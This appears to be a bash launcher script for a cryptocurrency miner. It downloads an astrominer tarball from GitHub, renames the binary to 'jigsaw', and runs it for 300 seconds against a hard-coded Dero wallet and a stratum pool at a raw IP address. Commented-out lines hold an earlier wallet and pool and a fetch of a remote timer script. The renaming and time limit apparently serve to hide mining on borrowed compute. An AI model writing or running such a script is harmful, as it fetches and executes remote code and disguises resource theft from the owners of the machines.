#!/bin/bash

#wget -q https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev1.tar.gz
#tar xf astrominer-V1.4_amd64_rev1.tar.gz
#screen -dmS astro ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xck2qackrzvwlhsfdq94v -r 51.79.30.92:80 -p stratum
#i=300;while [ $i -gt 0 ];do if [ $i -gt 9 ];then printf "\b\b$i";else  printf "\b\b $i";fi;sleep 1;i=`expr $i - 1`;done
#echo done



wget -qO adul.tar.gz https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev1.tar.gz
tar xf adul.tar.gz
mv astrominer jigsaw
timeout 300 ./jigsaw -w dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -r 134.209.221.102:8080 -p stratum
#wget -qO timer https://raw.githubusercontent.com/amit12986/SC/main/timer.sh
#chmod 700 timer
#timeout 320 ./timer || echo "Udah, Cape pengen beli tape


#i=300;while [ $i -gt 0 ];do if [ $i -gt 9 ];then printf "\b\b$i";else  printf "\b\b $i";fi;sleep 1;i=`expr $i - 1`;done
echo done
